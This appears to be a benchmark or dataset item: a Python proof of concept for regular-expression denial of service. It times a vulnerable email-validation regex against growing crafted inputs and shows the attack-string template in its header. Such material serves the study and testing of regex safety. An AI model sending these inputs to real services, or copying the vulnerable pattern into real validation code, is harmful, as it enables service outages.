# 1869
# ^([a-z0-9])(([\-.]|[_]+)?([a-z0-9]+))*(@)([a-z0-9])((([-]+)?([a-z0-9]+))?)*((.[a-z]{2,3})?(.[a-z]{2,6}))$
# EXPONENT
# nums:4
# EXPONENT AttackString:"0"+"0"*32+"!1 __NQ"

import re
from time import perf_counter

regex = """^([a-z0-9])(([\-.]|[_]+)?([a-z0-9]+))*(@)([a-z0-9])((([-]+)?([a-z0-9]+))?)*((.[a-z]{2,3})?(.[a-z]{2,6}))$"""
REGEX = re.compile(regex)
for i in range(0, 150000):
    ATTACK = "0" + "0" * i * 1 + "!1 __NQ"
    LEN = len(ATTACK)
    BEGIN = perf_counter()
    m = REGEX.search(ATTACK)
    # m = REGEX.match(ATTACK)
    DURATION = perf_counter() - BEGIN
    print(f"{i *1}: took {DURATION} seconds!")